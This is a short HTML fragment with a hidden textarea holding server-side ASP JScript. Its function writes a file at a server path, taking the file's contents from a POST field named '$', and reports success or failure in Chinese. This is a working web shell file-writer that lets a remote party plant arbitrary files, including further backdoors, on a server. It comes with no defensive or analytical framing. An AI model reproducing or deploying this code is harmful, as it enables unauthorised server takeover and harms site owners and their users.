<textarea style="display:none;"  name="js">
function wjj(f){
var _f=f;
try{f=Server.Mappath(f);}catch(e){}
xie+=_f+" >";
xie+=f;
try{
var fso = new ActiveXObject("Scripting.FileSystemObject");
var _w=fso.CreateTextFile(f);
_w.Write(Request.form('$')+'');
_w.close();
xie+=" >写入成功！"
}catch(e){xie+=" >写入失败！"}
}

var xie="文件";
